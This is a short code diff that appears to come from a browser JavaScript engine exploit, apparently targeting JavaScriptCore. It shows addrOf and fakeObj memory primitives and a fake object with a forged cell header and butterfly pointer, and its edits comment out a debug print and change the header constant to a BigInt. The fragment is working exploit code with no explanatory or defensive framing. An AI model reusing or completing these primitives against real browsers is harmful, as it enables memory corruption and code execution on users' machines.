@@ -117,7 +117,7 @@ function asBytes(v) {
 
 function asDouble(v) {
     let bytes = asBytes(v)
-    p("AsDouble: " + typeof(v) + " " + v + " is " + bytes)
+    // p("AsDouble: " + typeof(v) + " " + v + " is " + bytes)
     // Check for NaN
     if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
         throw new RangeError("Integer can not be represented by a double");
@@ -166,7 +166,7 @@ function asDouble(v) {
     */
 
     var container = {
-        jsCellHeader: asDouble(0x010824070052d8a0), // SKIP 1: See article about how to make structure id oracle.
+        jsCellHeader: asDouble(0x10824070051d8a0n), // SKIP 1: See article about how to make structure id oracle.
         butterfly: fakeObj(addrOf(hax) + 4n),
         vector: false,
         lengthAndFlags: false
